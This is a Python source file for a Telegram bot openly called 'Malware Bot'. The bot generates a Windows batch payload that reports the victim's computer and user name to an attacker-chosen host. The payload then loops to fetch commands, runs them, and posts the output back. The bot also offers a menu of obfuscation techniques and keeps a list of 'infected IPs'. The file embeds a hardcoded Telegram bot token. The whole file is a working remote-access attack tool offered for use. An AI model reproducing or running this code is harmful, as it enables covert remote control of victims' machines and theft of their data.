import os
from telebot import TeleBot, types
import random
import base64
import urllib.parse

# Telegram Bot Token
TOKEN = "7715229730:AAEHCrvUMifffinP0ADmLggj6arP_LtIW14"
bot = TeleBot(TOKEN)

# Infected IPs storage (simple list for now)
infected_ips = []

# Bot's own LHOST (change this to your actual bot's IP if needed)
BOT_LHOST = "your_bot_lhost_ip_here"  # Replace with your bot's LHOST IP

# Greetings message
welcome_message = "\U0001F680 Welcome to the Malware Bot! \U0001F680\n\nMenu:\n1) Generate Malware\n2) IP Details Lookup\n3) Who is making this?"

# Handle /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, welcome_message)

# Handle text messages
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()

    if text == "1":
        # Generate Malware Menu
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add("Generate Malware")
        markup.add("Cancel")
        bot.send_message(chat_id, "Choose an option:", reply_markup=markup)
    elif text == "Generate Malware":
        # Request lhost and lport
        bot.send_message(chat_id, "Enter LHOST (IP address):")
        bot.register_next_step_handler(message, ask_lport)
    elif text == "2":
        # IP Details Lookup
        if not infected_ips:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.add("Yes", "No")
            bot.send_message(chat_id, "You haven't infected anyone yet. Want to create a payload?", reply_markup=markup)
            bot.register_next_step_handler(message, ask_create_payload)
        else:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            # Show only the infected IPs, excluding the bot's LHOST
            for ip in infected_ips:
                if ip != BOT_LHOST:  # Exclude bot's LHOST from the list
                    markup.add(ip)
            bot.send_message(chat_id, "Choose an infected IP to control:", reply_markup=markup)
            bot.register_next_step_handler(message, control_infected_ip)
    elif text == "3":
        # Display creator name
        bot.send_message(chat_id, "This bot was created by: C4AMT")
    else:
        bot.send_message(chat_id, "Invalid option. Please select from the menu.")

def ask_lport(message):
    chat_id = message.chat.id
    lhost = message.text.strip()

    # Validate LHOST (make sure it's not the bot's own LHOST)
    if lhost == BOT_LHOST:
        bot.send_message(chat_id, "You cannot use the bot's own LHOST. Please provide the infected machine's IP.")
        bot.register_next_step_handler(message, ask_lport)
    else:
        bot.send_message(chat_id, "Enter LPORT (Port number):")
        bot.register_next_step_handler(message, generate_payload, lhost)

def generate_payload(message, lhost):
    chat_id = message.chat.id
    lport = message.text.strip()

    try:
        # Generate the custom payload script
        payload_script = (
            f"@echo off&cmd /V:ON /C \"SET ip={lhost}:{lport}&&"
            f"SET sid=\"Authorization: 87c756-82f9bc-a4fb45\"&&"
            f"SET protocol=http://&&"
            f"curl !protocol!!ip!/87c756/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL && "
            f"for /L %i in (0) do (curl -s !protocol!!ip!/82f9bc -H !sid! > !temp!cmd.bat & "
            f"type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & "
            f"curl !protocol!!ip!/a4fb45 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
        )

        # Add infected IP to the list (this is the user-provided IP)
        if lhost != BOT_LHOST:  # Ensure bot's LHOST is not added
            infected_ips.append(lhost)
        
        # Send the generated payload to the user
        bot.send_message(chat_id, f"Generated Payload:\n```\n{payload_script}\n```", parse_mode="Markdown")
        
        # Ask if they want further customization
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add("Yes, Obfuscate", "No, Done")
        bot.send_message(chat_id, "Do you want to obfuscate the payload?", reply_markup=markup)
        bot.register_next_step_handler(message, obfuscate_payload, payload_script)
    except Exception as e:
        # Handle errors gracefully
        bot.send_message(chat_id, f"Error generating payload: {str(e)}")

def obfuscate_payload(message, payload_script):
    chat_id = message.chat.id
    text = message.text.strip()

    if text == "Yes, Obfuscate":
        # Present all 15 obfuscation techniques
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        techniques = [
            "1) Base64 Encode", "2) Reverse String", "3) Character Shifting", "4) Random Case",
            "5) Unicode Escape", "6) Hex Encode", "7) Whitespace Injection", "8) Split and Reconstruct",
            "9) String Concatenation", "10) Environment Variables", "11) ROT13 Encoding", "12) URL Encoding",
            "13) Double Base64 Encode", "14) Inline Comments", "15) Custom Padding"
        ]
        for technique in techniques:
            markup.add(technique)
        bot.send_message(chat_id, "Choose obfuscation techniques (send one at a time):", reply_markup=markup)
        bot.register_next_step_handler(message, apply_obfuscation, payload_script)
    elif text == "No, Done":
        bot.send_message(chat_id, "Payload generation complete. Returning to the menu.")
        send_welcome(message)
    else:
        bot.send_message(chat_id, "Invalid option. Returning to the menu.")
        send_welcome(message)

def apply_obfuscation(message, payload_script):
    chat_id = message.chat.id
    technique = message.text.strip()

    obfuscated_payload = payload_script

    # Apply obfuscation techniques
    if "Base64 Encode" in technique:
        obfuscated_payload = base64.b64encode(payload_script.encode()).decode()
    elif "Reverse String" in technique:
        obfuscated_payload = payload_script[::-1]
    elif "Character Shifting" in technique:
        obfuscated_payload = "".join([chr(ord(c) + 1) for c in payload_script])
    elif "Random Case" in technique:
        obfuscated_payload = "".join([c.upper() if random.choice([True, False]) else c.lower() for c in payload_script])
    elif "Unicode Escape" in technique:
        obfuscated_payload = payload_script.encode('unicode_escape').decode()
    elif "Hex Encode" in technique:
        obfuscated_payload = "".join([f"\\x{ord(c):02x}" for c in payload_script])
    elif "Whitespace Injection" in technique:
        obfuscated_payload = " ".join(payload_script)
    elif "Split and Reconstruct" in technique:
        parts = [payload_script[i:i+5] for i in range(0, len(payload_script), 5)]
        obfuscated_payload = "+".join(parts)
    elif "String Concatenation" in technique:
        obfuscated_payload = " & " + " & ".join(payload_script.split())
    elif "Environment Variables" in technique:
        obfuscated_payload = payload_script.replace("SET", "%SET%")
    elif "ROT13 Encoding" in technique:
        obfuscated_payload = payload_script.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
        ))
    elif "URL Encoding" in technique:
        obfuscated_payload = urllib.parse.quote(payload_script)
    elif "Double Base64 Encode" in technique:
        obfuscated_payload = base64.b64encode(base64.b64encode(payload_script.encode())).decode()
    elif "Inline Comments" in technique:
        obfuscated_payload = "".join([f"{c}/*obf*/" for c in payload_script])
    elif "Custom Padding" in technique:
        obfuscated_payload = f"PADDING{random.randint(1000, 9999)}{payload_script}ENDPAD"

    bot.send_message(chat_id, f"Obfuscated Payload:\n```\n{obfuscated_payload}\n```")

# Run the bot
bot.polling(non_stop=True)

